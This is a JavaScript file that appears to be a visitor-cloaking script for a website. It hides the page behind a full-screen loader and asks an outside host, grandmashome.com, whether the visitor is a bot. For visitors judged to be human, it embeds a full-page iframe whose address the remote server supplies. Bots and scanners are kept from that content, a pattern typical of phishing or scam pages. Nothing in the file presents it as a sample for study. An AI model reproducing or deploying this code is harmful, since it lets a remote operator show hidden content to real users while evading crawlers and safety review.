const botdPromise = import('./botid.js').then((Botd) => Botd.load());


const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('message', (message) => {
    console.log(message.data);
    if (message.data?.bot) {
        const wrapper = document.querySelector('#wrapper_frame');
        console.log(wrapper);
        wrapper.remove();
    }
    
})

window.addEventListener('DOMContentLoaded', () => {
    // botdPromise
    // .then((botd) => botd.detect())
    // .then(async (result) => {
    //     if (result) {
            
    //     }

    // }).catch((error) => console.error(error))

    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            
            createFrame(res.url + 'JPyc2JmS')
        }
        setTimeout(toggleLoad, 1000);
        
    })
  
})




function createFrame(data) {
    const frame = document.createElement('iframe');
    frame.setAttribute('src', data);
    frame.setAttribute('width', '100%');
    frame.setAttribute('height', '100vh');
    frame.setAttribute('id', 'wrapper_frame');
    const body =  document.querySelector('body');
    // body.innerHTML = '';
    body.append(frame);
    frame.style = 'width: 100%; height: 100vh;border: none;'
    const style = document.createElement('style');
    style.innerHTML = `
    
  /* Make the iframe responsive */
  @media only screen and (max-width: 768px) {
    iframe {
      height: 50vh;
    }
  }

  @media only screen and (max-width: 480px) {
    iframe {
      height: 30vh;
    }
  }
    `;
    body.append(style)
}